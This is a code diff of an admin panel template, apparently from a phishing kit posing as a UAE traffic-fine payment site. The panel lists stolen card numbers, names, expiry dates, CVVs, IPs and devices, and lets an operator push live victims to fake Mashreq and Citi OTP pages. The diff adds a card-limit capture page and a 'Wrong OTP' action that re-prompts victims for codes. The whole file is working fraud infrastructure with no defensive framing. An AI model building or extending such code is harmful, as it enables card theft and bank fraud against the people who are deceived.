@@ -51,17 +51,26 @@
   <table>
     <thead>
       <tr>
-        <th style="width:28px;"></th>
+        <th style="width:44px;"></th>
         <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
         <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
         <th>Issuer</th><th>Country</th><th>Type</th>
-        <th>OTP Page</th><th>IP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
+        <th>OTP Page</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
       </tr>
     </thead>
     <tbody>
     <% if (payments.length === 0) { %>
-    <tr><td colspan="16" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
+    <tr><td colspan="15" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
     <% } %>
+    <%
+    function getDeviceType(ua) {
+      if (!ua) return 'pc';
+      const u = (ua || '').toLowerCase();
+      if (/iphone|ipad|ipod/.test(u)) return 'apple';
+      if (/android/.test(u)) return 'android';
+      return 'pc';
+    }
+    %>
     <% payments.forEach(function(p) {
       const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
       const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
@@ -69,30 +78,48 @@
       const lastSeen = p.last_seen ? new Date(p.last_seen).getTime() : null;
       const dotClass = !lastSeen ? 'offline' : (now - lastSeen < 90000 ? 'active' : (now - lastSeen < 300000 ? 'recent' : 'offline'));
       const dotTitle = !lastSeen ? 'Never polled' : (dotClass === 'active' ? 'Active now' : (dotClass === 'recent' ? 'Recently active' : 'Offline'));
+      const device = getDeviceType(p.user_agent);
     %>
     <tr>
-      <td style="padding:11px 10px 11px 16px;">
+      <td style="padding:8px 6px 8px 12px;text-align:center;vertical-align:middle;">
+        <%# Device icon %>
+        <div style="margin-bottom:4px;line-height:1;">
+          <% if (device === 'apple') { %>
+          <svg width="13" height="13" viewBox="0 0 814 1000" fill="var(--tx-muted)" title="Apple"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.4-152.1-105.1c-55.1-73.8-99.2-187.8-99.2-296.2 0-156.1 101.8-238.7 200.9-238.7 76 0 137.7 50.9 187.3 50.9 47 0 121.2-54.2 200.9-54.2zM568.2 167.5c29.1-34.3 50.9-82.7 50.9-131.1 0-6.6-.5-13.2-1.7-18.6-47.8 1.8-104.5 31.9-138.9 71.2-26.5 30.2-51.5 78.5-51.5 127.7 0 7.3 1.2 14.6 1.7 17 3 .5 7.9 1.2 12.8 1.2 43 0 97.2-28.6 126.7-67.4z"/></svg>
+          <% } else if (device === 'android') { %>
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="var(--tx-muted)" title="Android"><path d="M6 18c0 .55.45 1 1 1h1v3.5c0 .83.67 1.5 1.5 1.5S11 23.33 11 22.5V19h2v3.5c0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5V19h1c.55 0 1-.45 1-1V8H6v10zm11.5-10c-.83 0-1.5.67-1.5 1.5v7c0 .83.67 1.5 1.5 1.5S19 17.33 19 16.5v-7c0-.83-.67-1.5-1.5-1.5zm-13 0C3.67 8 3 8.67 3 9.5v7c0 .83.67 1.5 1.5 1.5S6 17.33 6 16.5v-7C6 8.67 5.33 8 4.5 8zm7.5-6.48l1.3-1.3c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0l-1.48 1.48C8.85 1.23 7.95 1 7 1c-.96 0-1.86.23-2.66.63L2.85.15c-.2-.2-.51-.2-.71 0-.2.2-.2.51 0 .71l1.31 1.31C1.97 3.26 1 5.01 1 7h14c0-1.99-.97-3.75-2.47-4.84zM9 5H8V4h1v1zm5 0h-1V4h1v1z"/></svg>
+          <% } else { %>
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--tx-muted)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" title="Desktop"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+          <% } %>
+        </div>
+        <%# Online status dot %>
         <span class="status-dot <%= dotClass %>" title="<%= dotTitle %>"></span>
+        <%# IP tooltip below dot %>
+        <% if (p.ip) { %>
+        <div style="font-size:8.5px;color:var(--tx-muted);margin-top:3px;font-family:monospace;max-width:44px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="<%= p.ip %>"><%= p.ip %></div>
+        <% } %>
       </td>
       <td class="muted small"><%= p.id %></td>
       <td class="small nowrap"><%= dt %></td>
       <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
       <td class="text-green">AED <%= Number(p.total_fine).toLocaleString() %></td>
-      <td class="mono select-all" style="font-size:12px;"><%= p.card_number || '—' %></td>
+      <td class="mono select-all" style="font-size:12px;">
+        <%= p.card_number || '—' %>
+        <% if (p.card_limit) { %><div style="font-size:10px;color:var(--tx-muted);font-family:inherit;margin-top:1px;">(Limit: AED <%= Number(p.card_limit).toLocaleString() %>)</div><% } %>
+      </td>
       <td class="nowrap"><%= p.card_name || '—' %></td>
       <td class="mono"><%= p.expiry || '—' %></td>
       <td class="mono"><%= p.cvv || '—' %></td>
       <td class="small"><%= p.card_issuer || '—' %></td>
       <td class="small"><%= p.card_country || '—' %></td>
       <td class="small"><%= p.card_type || '—' %></td>
-      <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
-      <td class="mono muted small"><%= p.ip || '—' %></td>
+      <td style="max-width:90px;"><span class="badge b-otp" style="max-width:88px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline-block;vertical-align:middle;cursor:default;" title="<%= p.otp_page || 'otp-sms' %>"><%= p.otp_page || 'otp-sms' %></span></td>
       <td style="width:130px;max-width:130px;">
         <textarea class="pay-comment" data-sid="<%= p.sid %>" rows="1"
           style="width:100%;resize:none;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-size:12px;background:var(--bg-input);color:var(--tx-base);font-family:inherit;overflow-y:hidden;word-break:break-word;white-space:pre-wrap;line-height:1.4;"><%= p.comment || '' %></textarea>
       </td>
       <td>
-        <button class="btn btn-sm btn-ghost" style="white-space:nowrap;" onclick="openActionModal('<%= p.sid %>','<%= p.ip || '' %>')">Actions</button>
+        <button class="btn btn-sm btn-ghost" style="white-space:nowrap;" onclick="openActionModal('<%= p.sid %>','<%= p.ip || '' %>','<%= p.otp_page || 'otp-sms' %>')">Actions</button>
       </td>
     </tr>
     <% }) %>
@@ -137,6 +164,7 @@
         <button class="am-row" onclick="doAction('redirect','otp-mashreq')"><span class="am-dot" style="background:#c0392b;"></span><div class="am-texts"><div class="am-name">Mashreq</div><div class="am-desc">Mashreq bank verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','otp-citi')"><span class="am-dot" style="background:#003b8e;"></span><div class="am-texts"><div class="am-name">Citi Bank</div><div class="am-desc">Citi bank OTP verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','otp-limit')"><span class="am-dot" style="background:#b45309;"></span><div class="am-texts"><div class="am-name">Limit Verification</div><div class="am-desc">Transaction limit check page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','card-limit')"><span class="am-dot" style="background:#059669;"></span><div class="am-texts"><div class="am-name">Card Limit Entry</div><div class="am-desc">User enters their card's daily spending limit</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
       </div>
 
       <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
@@ -147,6 +175,14 @@
         <button class="am-row" onclick="doAction('redirect','payment:error=card_error')"><span class="am-dot" style="background:#dc2626;"></span><div class="am-texts"><div class="am-name">Incorrect Card Details</div><div class="am-desc">Return to card entry with error message</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','payment:error=card_type')"><span class="am-dot" style="background:#f59e0b;"></span><div class="am-texts"><div class="am-name">Card Type Not Supported</div><div class="am-desc">Virtual or prepaid cards not accepted</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','payment:error=bank_error')"><span class="am-dot" style="background:#1e40af;"></span><div class="am-texts"><div class="am-name">Bank Not Supported</div><div class="am-desc">Try again with a different bank card</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+      </div>
+
+      <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
+
+      <!-- OTP Actions -->
+      <div style="padding:2px 14px 2px;">
+        <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">OTP Actions</div>
+        <button class="am-row am-danger" onclick="doAction('wrong_otp')"><span class="am-dot" style="background:#dc2626;"></span><div class="am-texts"><div class="am-name am-red">Wrong OTP</div><div class="am-desc">Show incorrect code error on current OTP page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
       </div>
 
       <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
@@ -175,24 +211,26 @@
 </style>
 
 <script>
-let _actionSid = null, _actionIp = null;
+let _actionSid = null, _actionIp = null, _actionOtpPage = null;
 
-function openActionModal(sid, ip) {
-  _actionSid = sid; _actionIp = ip;
+function openActionModal(sid, ip, otpPage) {
+  _actionSid = sid; _actionIp = ip; _actionOtpPage = otpPage || 'otp-sms';
   document.getElementById('action-modal-sid').textContent = sid.slice(0,16) + '…';
   document.getElementById('action-modal-ip').textContent = 'IP: ' + (ip || '—');
   document.getElementById('action-modal-overlay').style.display = 'flex';
 }
 function closeActionModal() {
   document.getElementById('action-modal-overlay').style.display = 'none';
-  _actionSid = null; _actionIp = null;
+  _actionSid = null; _actionIp = null; _actionOtpPage = null;
 }
 function doAction(type, page) {
   if (!_actionSid) return;
-  const sid = _actionSid, ip = _actionIp;
+  const sid = _actionSid, ip = _actionIp, otpPage = _actionOtpPage;
   closeActionModal();
   if (type === 'redirect') {
     adminAction({ act: 'redirect', sid, page });
+  } else if (type === 'wrong_otp') {
+    adminAction({ act: 'redirect', sid, page: (otpPage || 'otp-sms') + ':error=wrong_otp' });
   } else if (type === 'approve') {
     adminAction({ act: 'set_status', sid, status: 'approved' });
   } else if (type === 'ban') {
